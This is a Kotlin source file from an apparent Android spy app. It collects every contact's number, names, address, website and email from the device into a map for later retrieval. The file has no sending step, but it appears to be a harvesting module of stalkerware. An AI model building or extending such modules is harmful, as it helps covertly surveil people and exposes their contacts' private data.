package com.komnacki.androidspyapp.contacts

import android.content.Context
import android.util.Log
import com.komnacki.androidspyapp.Message


class ContactsState(override var context: Context) :
    Message {
    init {
        Log.d("KK: ", "ContactsState")
        getContactsState(
            context
        )
    }

    companion object {
        private val info: MutableMap<String, Any> = mutableMapOf()

        fun getContactsState(context: Context) {
            val importContacts = ImportContacts(context)
            importContacts.contacts.forEach { c ->
                if (c.numbers[0] != null && c.displaydName != null) {
                    val contact = Contact(
                        c.numbers[0].normalizedNumber,
                        if (c.firstName != null) c.firstName else "",
                        if (c.lastName != null) c.lastName else "",
                        if (c.displaydName != null) c.displaydName else "",
                        if (!c.addresses.isNullOrEmpty()) c.addresses[0].address else "",
                        if (!c.websites.isNullOrEmpty()) c.websites[0].website else "",
                        if (!c.emails.isNullOrEmpty()) c.emails[0].email else ""
                    )
                    var displayName = c.displaydName
                        .replace("/", " ")
                        .replace("#", " ")
                        .replace("\\", " ")
                        .replace(",", " ")
                        .replace(".", " ")
                        .replace("(", " ")
                        .replace(")", " ")
                        .replace(" ", "_")
//                        .replace("ą", "a")
//                        .replace("ę", "e")
//                        .replace("ó", "o")
//                        .replace("ś", "s")
//                        .replace("ł", "l")
//                        .replace("ż", "z")
//                        .replace("ź", "z")
//                        .replace("ć", "c")
//                        .replace("ń", "n")
//                        .replace("Ą", "A")
//                        .replace("Ę", "E")
//                        .replace("Ó", "O")
//                        .replace("Ś", "S")
//                        .replace("Ł", "L")
//                        .replace("Ż", "Z")
//                        .replace("Ź", "Z")
//                        .replace("Ć", "C")
//                        .replace("Ń", "N")

//                    Log.d("KK: ", "contact: " + number + ", " + displayName)
                    info.put(displayName, contact)
                }
            }
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}